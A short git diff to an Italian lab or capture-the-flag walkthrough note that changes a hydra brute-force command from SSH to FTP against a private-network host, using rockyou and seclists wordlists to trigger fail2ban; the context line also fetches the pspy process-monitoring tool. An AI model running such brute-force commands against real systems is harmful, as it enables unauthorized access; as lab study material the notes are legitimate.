@@ -183,7 +183,7 @@ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
 Aspetta il restart tramite cronjob (ogni minuto)
 tenta di bruteforzare ftp per triggerare fail2ban
 ```bash
-hydra -L /usr/share/wordlists/seclists/Usernames/CommonAdminBase64.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.86.129
+hydra -L /usr/share/wordlists/seclists/Usernames/CommonAdminBase64.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.86.129
 ```
 ![[Pasted image 20231012172132.png]]
 ![[Pasted image 20231012172158.png]]
